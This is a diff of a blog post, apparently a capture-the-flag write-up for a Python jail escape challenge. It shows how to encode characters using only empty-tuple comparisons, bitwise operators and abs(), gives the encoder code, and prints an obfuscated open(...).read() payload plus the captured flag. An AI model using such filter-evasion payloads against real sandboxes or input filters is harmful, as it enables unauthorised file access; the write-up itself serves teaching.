@@ -4,7 +4,7 @@ date = 2025-01-06T00:08:48-05:00
 draft = false
 +++
 
-Cobra's Den was a python jail escape challenge for IrisCTF 2025.
+Cobra's Den was a python jail escape challenge for IrisCTF 2025. What better way to start the new year than with a pyjail?
 
 Lets take a look at the code
 ```python
@@ -37,7 +37,7 @@ The whitelist is quite restrictive, we can only use the characters from `<ph[(co
 
 ## Getting characters without characters
 
-First, we can do comparisons on empty tuples which gets us `True` and `False`. In python, `True` is equal to 1 and `False` is equal to 0.  Unfortunetly we cannot use the equals sign to do:
+First, we can do comparisons on empty tuples which gets us `True` and `False`. In python, `True` is equal to 1 and `False` is equal to 0. We can use these to encode numbers and then use `chr()` to encode flag. Unfortunetly we cannot use the equals sign to do:
 ```python
 >>> ()==()
 True
@@ -54,19 +54,17 @@ We can use `~` the bitwise NOT operator to get -1
 ```
 And since we also can use + we can add -1 to itself to get -2 and bitwise NOT to get 1
 ```python
->>>~(~(()>())+~(()>()))
+>>> ~(~(()>())+~(()>()))
 1
 ```
 Unfortunetly if we try to build out the digits 1-9 this way, we run into the character limit as the strings get very lengthy. Looking at the built in functions we could use, I saw abs(), and using that we can get 1 by doing:
 ```python
->>>abs(~(()<()))
+>>> abs(~(()<()))
 1
 ```
 
 Now we can build out the numbers 1 - 9:
-
 ```python
-
 def encode_digit(number: int):
     if number == 0:
         return """()<()"""
@@ -91,7 +89,6 @@ def encode_digit(number: int):
 ```
 
 From there we can encode any number:
-
 ```python
 def encode_number(number: int):
     if number < 10:
@@ -117,17 +114,17 @@ def encode_number(number: int):
 
 And then any text:
 ```python
-
 def encode_text(text: str):
     result = ""
     for ch in map(ord, text):
         result += "chr(" + encode_number(ch) + ")+"
-    result[::-1]
-    print(len(result))
     return result
 ```
-
-Gettin us our final payload just over 850 chars, well under the limit
+Gettin us our final payload of just over 850 chars, well under the limit
 
 ```python
 open(chr((abs(~(()<()))<<abs(~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr((abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr(abs(~(()<()))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr(abs(~(()<()))+(abs(~(()<()))<<abs(~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))).read()
+```
+
+
+`irisctf{pyth0n_has_s(+([]<[]))me_whacky_sh(+([]<[[]]))t}`
